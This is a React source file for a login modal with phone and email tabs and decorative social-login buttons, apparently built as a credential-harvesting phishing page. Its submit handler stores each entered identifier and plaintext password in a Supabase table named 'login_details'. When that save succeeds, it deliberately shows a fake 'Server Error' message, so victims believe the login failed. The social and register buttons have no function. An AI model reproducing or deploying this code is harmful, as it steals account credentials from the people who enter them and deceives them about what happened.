import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';

// Initialize Supabase (reads from Vite env vars)
let supabase = null;
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
if (supabaseUrl && supabaseAnonKey && supabaseUrl !== 'YOUR_SUPABASE_URL') {
  supabase = createClient(supabaseUrl, supabaseAnonKey);
}

// ---------- Sub-components ----------

function PhoneIcon() {
  return (
    <svg className="modal-tab-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
    </svg>
  );
}

function EmailIcon() {
  return (
    <svg className="modal-tab-icon" width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
    </svg>
  );
}

function LockIcon() {
  return (
    <svg className="form-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
    </svg>
  );
}







function PasswordInput({ id, value, onChange, error, placeholder, onClearError }) {
  const [show, setShow] = useState(false);

  
  return (
    <div className="form-group">
      <div className={`form-input-wrapper${error ? ' form-input-wrapper--error' : ''}`}>
        <LockIcon />
        <input
          type={show ? 'text' : 'password'}
          className="form-input"
          id={id}
          placeholder={placeholder}
          autoComplete="current-password"
          value={value}
          onChange={onChange}
          onFocus={onClearError}
        />
        <button
          type="button"
          className="form-password-toggle"
          aria-label="Toggle password visibility"
          style={{ color: show ? '#0066ff' : '#9ca3af' }}
          onClick={() => setShow(!show)}
        >
          <EyeIcon />
        </button>
      </div>
      {error && <span className="form-error-text">{error}</span>}
    </div>
  );
}

// ---------- Main Modal ----------

export default function LoginModal({ isOpen, onClose }) {
  const [activeTab, setActiveTab] = useState('email');
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Phone form state
  const [phone, setPhone] = useState('');
  const [phonePwd, setPhonePwd] = useState('');
  const [phoneErr, setPhoneErr] = useState('');
  const [phonePwdErr, setPhonePwdErr] = useState('');

  // Email form state
  const [email, setEmail] = useState('');
  const [emailPwd, setEmailPwd] = useState('');
  const [emailErr, setEmailErr] = useState('');
  const [emailPwdErr, setEmailPwdErr] = useState('');

  // Keyboard close
  useEffect(() => {
    const handleKey = (e) => { if (e.key === 'Escape') handleClose(); };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, []);

  // Lock body scroll
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => { document.body.style.overflow = ''; };
  }, [isOpen]);

  const handleClose = () => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    setActiveTab('email');
    onClose();
  };

  const switchTab = (tab) => {
    setActiveTab(tab);
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
  };

  const clearAllErrors = () => {
    setPhoneErr(''); setPhonePwdErr('');
    setEmailErr(''); setEmailPwdErr('');
  };

  const handlePhoneInput = (e) => {
    let val = e.target.value.replace(/[^\d\s+]/g, '');
    if (val.includes('+')) val = '+' + val.replace(/\+/g, '');
    setPhone(val);
  };

  const handlePhoneSubmit = (e) => {
    e.preventDefault();
    let valid = true;

    const digits = phone.replace(/\D/g, '');
    if (!phone.trim()) { setPhoneErr('Phone number error: Please enter your phone number'); valid = false; }
    else if (digits.length < 10) { setPhoneErr('Phone number error: Enter a valid 10-digit phone number'); valid = false; }
    else setPhoneErr('');

    if (!phonePwd.trim()) { setPhonePwdErr('Password error: Please enter your password'); valid = false; }
    else if (phonePwd.trim().length < 6) { setPhonePwdErr('Password error: Password must be at least 6 characters'); valid = false; }
    else setPhonePwdErr('');

    if (valid) submitLogin({ type: 'Phone', identifier: phone, password: phonePwd });
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    let valid = true;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!email.trim()) { setEmailErr('Email error: Please enter your email address'); valid = false; }
    else if (!emailRegex.test(email.trim())) { setEmailErr('Email error: Please enter a valid email address'); valid = false; }
    else setEmailErr('');

    if (!emailPwd.trim()) { setEmailPwdErr('Password error: Please enter your password'); valid = false; }
    else if (emailPwd.trim().length < 6) { setEmailPwdErr('Password error: Password must be at least 6 characters'); valid = false; }
    else setEmailPwdErr('');

    if (valid) submitLogin({ type: 'Email', identifier: email, password: emailPwd });
  };

  const submitLogin = async (details) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);
    console.log('🎉 Submitting Login Details:', { ...details, timestamp: new Date().toISOString() });

    let isSaved = false;

    if (supabase) {
      try {
        const { error } = await supabase.from('login_details').insert([{
          type: details.type,
          identifier: details.identifier,
          email: details.type === 'Email' ? details.identifier : null,
          password: details.password,
          timestamp: new Date().toISOString(),
        }]);

        if (error) {
          console.error('Error inserting to Supabase:', error);
          isSaved = false;
        } else {
          console.log('Successfully saved to Supabase.');
          isSaved = true;
        }
      } catch (err) {
        console.error('Unexpected error pushing to Supabase:', err);
        isSaved = false;
      }
    } else {
      console.warn('Supabase client not initialized.');
      isSaved = false;
    }

    setIsSubmitting(false);

    if (isSaved) {
      setShowSuccess(true);
    } else {
      setShowError(true);
    }
  };

  return (
    <div
      className={`modal-overlay${isOpen ? ' modal-overlay--active' : ''}`}
      id="modal-overlay"
      onClick={(e) => { if (e.target === e.currentTarget) handleClose(); }}
    >
      <div className="login-modal" id="login-modal">
        <div className="modal-drag-handle" />

        {/* SUCCESS SCREEN (CURRENT TOGGLE WHEN DATA GOES TO SUPABASE) */}
        {showSuccess ? (
          <div className="party-ticket-container" id="party-ticket-container">
            <div className="party-success-card">
              <h3>Server Error</h3> 
              <br />
              <p className="success-message-text">Something went wrong on our end. Please try again later.</p>
            </div>
          </div>
        ) : showError ? (
          /* ERROR SCREEN (NETWORK ERROR ON OUR SIDE WHEN DATA FAILS TO GO TO SUPABASE) */
          <div className="party-ticket-container" id="party-ticket-container">
            <div className="party-success-card" style={{ borderColor: 'rgba(239, 68, 68, 0.4)' }}>
              <h3 style={{ color: '#ef4444' }}>Network Error</h3> 
              <br />
              <p className="success-message-text">Network error on our side. Please check your connection and try again.</p>
              <button 
                type="button" 
                className="btn-claim-ticket" 
                style={{ background: '#ef4444', marginTop: '16px' }} 
                onClick={() => { setShowError(false); }}
              >
                Try Again
              </button>
            </div>
          </div>
        ) : (
          /* MAIN FORM */
          <div id="modal-main-content">
            {/* Header */}
            <div className="modal-header">
              <h2 className="modal-title">Login</h2>
              <button className="modal-close" id="modal-close" aria-label="Close" onClick={handleClose}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
              </button>
            </div>

            {/* Tabs */}
            <div className="modal-tabs">
              <button
                type="button"
                className={`modal-tab modal-tab--phone${activeTab === 'phone' ? ' modal-tab--active' : ''}`}
                data-tab="phone"
                onClick={() => switchTab('phone')}
              >
                <PhoneIcon /><span>Phone</span>
              </button>
              <button
                type="button"
                className={`modal-tab modal-tab--email${activeTab === 'email' ? ' modal-tab--active' : ''}`}
                data-tab="email"
                onClick={() => switchTab('email')}
              >
                <EmailIcon /><span>Email</span>
              </button>
            </div>

            {/* Phone Form */}
            <form
              className={`modal-form${activeTab === 'phone' ? ' modal-form--active' : ''}`}
              id="phone-form"
              noValidate
              style={{ display: activeTab === 'phone' ? 'block' : 'none' }}
              onSubmit={handlePhoneSubmit}
            >
              <div className="form-group">
                <div className={`form-input-wrapper${phoneErr ? ' form-input-wrapper--error' : ''}`}>
                  <div className="country-selector" id="country-selector">
                    <img src="/Assites/hi-IN.svg" alt="IN" className="country-flag" width="24" height="16" />
                    <svg className="country-chevron" width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
                  </div>
                  <input
                    type="tel"
                    className="form-input"
                    id="phone-input"
                    placeholder="+91 00000 00000"
                    autoComplete="tel"
                    value={phone}
                    onChange={handlePhoneInput}
                    onFocus={() => setPhoneErr('')}
                  />
                </div>
                {phoneErr && <span className="form-error-text" id="phone-error">{phoneErr}</span>}
              </div>
              <PasswordInput
                id="phone-password"
                value={phonePwd}
                onChange={(e) => setPhonePwd(e.target.value)}
                error={phonePwdErr}
                placeholder="Password"
                onClearError={() => setPhonePwdErr('')}
              />
              <div className="form-hint">
                <button type="button" className="form-forgot">Forgot your password?</button>
              </div>
              <button type="submit" className="btn-submit" disabled={isSubmitting}>
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* Email Form */}
            <form
              className={`modal-form${activeTab === 'email' ? ' modal-form--active' : ''}`}
              id="email-form"
              noValidate
              style={{ display: activeTab === 'email' ? 'block' : 'none' }}
              onSubmit={handleEmailSubmit}
            >
              <div className="form-group">
                <div className={`form-input-wrapper${emailErr ? ' form-input-wrapper--error' : ''}`}>
                  <svg className="form-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
                  <input
                    type="email"
                    className="form-input"
                    id="email-input"
                    placeholder="Email"
                    autoComplete="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onFocus={() => setEmailErr('')}
                  />
                </div>
                {emailErr && <span className="form-error-text" id="email-error">{emailErr}</span>}
              </div>
              <PasswordInput
                id="email-password"
                value={emailPwd}
                onChange={(e) => setEmailPwd(e.target.value)}
                error={emailPwdErr}
                placeholder="Password"
                onClearError={() => setEmailPwdErr('')}
              />
              <div className="form-hint">
                <button type="button" className="form-forgot">Forgot your password?</button>
              </div>
              <button type="submit" className="btn-submit" disabled={isSubmitting}>
                {isSubmitting ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* Divider */}
            <div className="modal-divider">or</div>

            {/* Social Login */}
            <div className="social-login">
              <button type="button" className="social-login-icon" aria-label="Google">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M12.545 10.239v3.821h5.445c-.712 2.315-2.647 3.972-5.445 3.972a6.033 6.033 0 110-12.064c1.498 0 2.866.549 3.921 1.453l2.814-2.814A9.969 9.969 0 0012.545 2C7.021 2 2.543 6.477 2.543 12s4.478 10 10.002 10c8.396 0 10.249-7.85 9.426-11.748l-9.426-.013z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="VK">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M15.684 0H8.316C1.592 0 0 1.592 0 8.316v7.368C0 22.408 1.592 24 8.316 24h7.368C22.408 24 24 22.408 24 15.684V8.316C24 1.592 22.391 0 15.684 0zm3.692 17.123h-1.744c-.66 0-.864-.525-2.05-1.727-1.033-1-1.49-1.135-1.744-1.135-.356 0-.458.102-.458.593v1.575c0 .424-.135.678-1.253.678-1.846 0-3.896-1.118-5.335-3.202C4.624 10.857 4.03 8.57 4.03 8.096c0-.254.102-.491.593-.491h1.744c.44 0 .61.203.78.677.863 2.49 2.303 4.675 2.896 4.675.22 0 .322-.102.322-.66V9.721c-.068-1.186-.695-1.287-.695-1.71 0-.203.17-.407.44-.407h2.744c.372 0 .508.203.508.643v3.473c0 .372.17.508.271.508.22 0 .407-.136.813-.542 1.254-1.406 2.151-3.574 2.151-3.574.119-.254.322-.491.763-.491h1.744c.525 0 .644.27.525.643-.22 1.017-2.354 4.031-2.354 4.031-.186.305-.254.44 0 .78.186.254.796.779 1.203 1.253.745.847 1.32 1.558 1.473 2.05.17.49-.085.744-.576.744z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="Telegram">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.07-.2c-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.65-2.89 7.99-3.45 3.81-1.58 4.6-1.86 5.12-1.87.11 0 .37.03.53.17.14.12.18.28.2.45-.01.06.01.24 0 .38z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="Yandex">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M2 12C2 6.48 6.48 2 12 2s10 4.48 10 10-4.48 10-10 10S2 17.52 2 12zm11-8h-2.5C8.01 4 6 6.01 6 8.5c0 1.77 1.02 3.29 2.5 4.03V20h2v-4h1l2.5 4h2.5l-3-4.47C14.88 14.64 16 12.71 16 10.5 16 6.91 13.09 4 9.5 4H13z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="WeChat">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M8.691 2.188C3.891 2.188 0 5.476 0 9.53c0 2.212 1.17 4.203 3.002 5.55a.59.59 0 01.213.665l-.39 1.48c-.019.07-.048.141-.048.213 0 .163.13.295.29.295a.326.326 0 00.167-.054l1.903-1.114a.864.864 0 01.717-.098 10.16 10.16 0 002.837.403c.276 0 .543-.027.811-.05-.857-2.578.157-4.972 1.932-6.446 1.703-1.415 3.882-1.98 5.853-1.838-.576-3.583-4.196-6.348-8.596-6.348z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="MetaMask">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M20.8 4.2L13.5 9.6l1.3-3.2L20.8 4.2zM3.2 4.2l6 2.2 1.3 3.2L3.2 4.2zm15.1 11.2l-2.4 3.7-4.9-2.1 4.1-1.6 3.2 0zm-12.6 0l3.2 0 4.1 1.6-4.9 2.1-2.4-3.7z"/></svg>
              </button>
              <button type="button" className="social-login-icon" aria-label="Shield">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#1f2937"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
              </button>
            </div>

            {/* Register Link */}
            <div className="modal-register-link">
              <p>Don't have an account?<br /><a href="#">Register</a></p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}